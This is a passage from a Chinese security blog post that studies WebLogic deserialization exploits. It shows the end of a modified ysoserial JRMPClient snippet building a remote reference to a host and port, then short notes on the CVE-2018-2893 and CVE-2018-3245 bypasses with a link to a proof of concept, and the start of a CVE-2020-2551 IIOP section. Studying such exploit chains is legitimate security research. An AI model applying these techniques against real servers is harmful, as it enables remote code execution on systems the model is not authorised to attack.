class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port);</span><br><span class="line">    <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line">    <span class="keyword">return</span> ref;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码是修改ysoserial的JRMPClient模块后的代码</p>
<h1 id="CVE-2018-2893（绕过2）"><a href="#CVE-2018-2893（绕过2）" class="headerlink" title="CVE-2018-2893（绕过2）"></a>CVE-2018-2893（绕过2）</h1><p>由于weblogic一直没有处理streamMessageImpl，导致CVE-2016-0638 + CVE-2018-2628 &#x3D; CVE-2018-2893，用streamMessageImpl封装一下而已。</p>
<h1 id="CVE-2018-3245-绕过3"><a href="#CVE-2018-3245-绕过3" class="headerlink" title="CVE-2018-3245(绕过3)"></a>CVE-2018-3245(绕过3)</h1><p>RMIConnectionImpl_Stub代替RemoteObjectInvocationHandler，实际上就是找RemoteObject类的子类。<a target="_blank" rel="noopener" href="https://github.com/pyn3rd/CVE-2018-3245">https://github.com/pyn3rd/CVE-2018-3245</a></p>
<h1 id="CVE-2020-2551-IIOP协议反序列化RCE"><a href="#CVE-2020-2551-IIOP协议反序列化RCE" class="headerlink" title="CVE-2020-2551 IIOP协议反序列化RCE"></a>CVE-2020-2551 IIOP协议反序列化RCE</h1><h2 id="环境-4"><a href="#环境-4" class="headerlink" title="环境"></a>环境</h2><p>weblogic10.3.6+jdk1.6 idea+jdk1.8+jdk1.6</p>
<h2 id="IIOP介绍"><a href="#IIOP介绍" class="headerlink" title="IIOP介绍"></a>IIOP介绍</h2>
    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/Java/" class="tag">#Java</a><a href="/tags/CTF/" class="tag">#CTF</a><a href="/tags/Weblogic/" class="tag">#Weblogic</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2023/05/01/Mozilla%20Rhino%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">Mozilla Rhino反序列化利用链学习</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2023/04/26/%E5%9C%A8Java%E4%B8%AD%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">Java中任意文件写场景下的RCE</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2025 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>